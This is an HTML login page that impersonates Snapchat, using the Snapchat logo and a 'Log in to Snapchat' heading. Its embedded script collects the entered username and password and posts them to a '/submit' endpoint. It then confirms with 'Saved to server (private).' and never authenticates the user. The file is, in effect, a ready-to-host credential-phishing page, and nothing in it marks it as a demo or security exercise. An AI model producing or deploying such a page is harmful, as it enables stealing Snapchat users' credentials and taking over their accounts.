<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #ffffff; /* yellow background */
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .login-card {
      background: white;
      padding: 40px 30px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      width: 320px;
      max-width: 90%;
      text-align: center;
      box-sizing: border-box;
    }

    .login-card img {
      width: 60px;
      margin-bottom: 20px;
    }

    .login-card h2 {
      margin: 0 0 30px 0;
      font-size: 24px;
      font-weight: bold;
    }

    label {
      display: block;
      text-align: left;
      margin-bottom: 5px;
      font-size: 14px;
      color: #555;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px 10px;
      margin-bottom: 20px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
      box-sizing: border-box;
    }

    .forgot {
      font-size: 14px;
      color: #2196f3;
      text-decoration: none;
      display: block;
      margin-bottom: 20px;
    }

    button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      background-color: #2196f3;
      color: white;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #1976d2;
    }

    /* Responsive adjustments for small screens */
    @media (max-width: 400px) {
      .login-card {
        padding: 30px 20px;
      }

      .login-card h2 {
        font-size: 20px;
      }

      input[type="text"], input[type="password"] {
        font-size: 14px;
        padding: 10px 8px;
      }

      button {
        font-size: 14px;
        padding: 10px;
      }

      label {
        font-size: 13px;
      }
    }
  </style>
</head>
<body>

  <div class="login-card">
    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1024px-Snapchat_logo.svg.png" alt="Logo">
    <h2>Log in to Snapchat</h2>

    <form id="form">
      <div>
        <label for="username">Username</label>
        <input id="username" type="text" required>
      </div>

      <div>
        <label for="password">Password</label>
        <input id="password" type="password" required>
      </div>

      <a href="#" class="forgot">Forgot Password</a>
      <button type="submit">Next</button>
    </form>
  </div>

  <script>
    const form = document.getElementById('form');
    const passwordInput = document.getElementById('password');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const u = document.getElementById('username').value;
      const p = passwordInput.value;

      try {
        const res = await fetch('/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: u, password: p })
        });

        const json = await res.json();
        if (json.success) {
          alert('Saved to server (private).');
          form.reset();
        } else {
          alert('Error: ' + (json.error || 'unknown'));
        }
      } catch (err) {
        alert('Request failed: ' + err.message);
      }
    });
  </script>

</body>
</html>
